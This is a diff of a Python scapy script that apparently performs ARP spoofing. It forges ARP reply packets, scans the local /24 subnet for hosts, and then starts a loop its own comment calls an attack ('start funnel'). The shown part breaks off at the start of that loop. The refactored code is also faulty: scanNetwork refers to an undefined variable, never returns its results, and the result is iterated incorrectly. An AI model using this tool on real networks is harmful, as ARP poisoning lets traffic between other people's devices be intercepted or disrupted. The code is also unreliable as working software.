@@ -1,3 +1,4 @@
+from datetime import datetime
 import scapy.all as scapy
 import socket
 import psutil
@@ -6,6 +7,8 @@ import uuid
 import time
 
 
+
+# package functions
 def createARPpackage(ip, mac, ipTo, op=2):
     return scapy.ARP(
         op=op,
@@ -25,10 +28,21 @@ def sendPackage(package, to):
     )
 
 
+# current machine info getters
 def getMyMac():
     mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
     return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
 
+def getLocalIpByInterface(interface_name: str):
+    net_if_addrs = psutil.net_if_addrs()
+    if interface_name in net_if_addrs:
+        for addr in net_if_addrs[interface_name]:
+            if addr.family == socket.AF_INET:
+                return addr.address
+    return None
+
+
+# network scanner
 
 def scan(ip):
     arpPacket = scapy.ARP( # arp request WHO HAS (1) (as default)
@@ -43,48 +57,53 @@ def scan(ip):
 
     return scapy.srp(arpPush, timeout=10, verbose=False)[0]
 
-def get_ip_by_interface(interface_name):
-    net_if_addrs = psutil.net_if_addrs()
-    if interface_name in net_if_addrs:
-        for addr in net_if_addrs[interface_name]:
-            if addr.family == socket.AF_INET:
-                return addr.address
-    return None
-
-
-def main():
-    # finding current machine info
-    myIp = get_ip_by_interface(sys.argv[1])
-    if myIp is None:
-        print('Cannot recognize local ip')
-        sys.exit(1)
-
-    myMac = getMyMac()
-    networkMask = '.'.join(myIp.split('.')[:-1]) + '.0/24'
-
-    print(f'Machine IP: {myIp}  MAC: {myMac}')
-    print(f'interface: {sys.argv[1]}')
-
-    # scanning network for hosts (arp -a command)
+def scanNetwork(mask: str, networkScanCCount: int=5):
     networkScan = {}
 
-    try:
-        for _ in range(20):
+    for _ in range(networkScanCCount):
+        try:
             for cl in scan(networkMask):
                 if cl.answer.psrc not in networkScan:
                     print(f'{cl.answer.psrc} with mac {cl.answer.hwsrc} found in network')
 
                 networkScan[cl.answer.psrc] = cl.answer.hwsrc
-            print(f'[{_}] Scan ')
-    except KeyboardInterrupt: pass
+            print(f'{datetime.now()}   [{_}/{networkScanCCount}] Scanning... ', end='\r')
 
-    print(networkScan)
+        except KeyboardInterrupt: break
+
+
+
+
+def main():
+    # CONFIGS
+    networkScanCCount = 5 # how many times am i need to scan local network for devices
+
+
+    # finding current machine info
+    myIp = getLocalIpByInterface(sys.argv[1])
+    if myIp is None:
+        print('Cannot recognize local ip')
+        sys.exit(1)
+
+    networkMask = '.'.join(myIp.split('.')[:-1]) + '.0/24'
+    myMac = getMyMac()
+
+    print(f'Machine IP: {myIp}  MAC: {myMac}')
+    print(f'interface: {sys.argv[1]}')
+
+
+    # scanning network for hosts (arp -a command)
+    networkScan = scanNetwork(networkMask, networkScanCCount=networkScanCCount)
+
+    print(f'{datetime.now()}   Found devices: ')
     for host, mac in networkScan:
         print(host, '  ', mac)
 
-    input('Press Enter to start funnel.')
+
 
     #  starting atack
+    input('Press Enter to start funnel.')
+
     sentPackCount = 0
 
     while True:
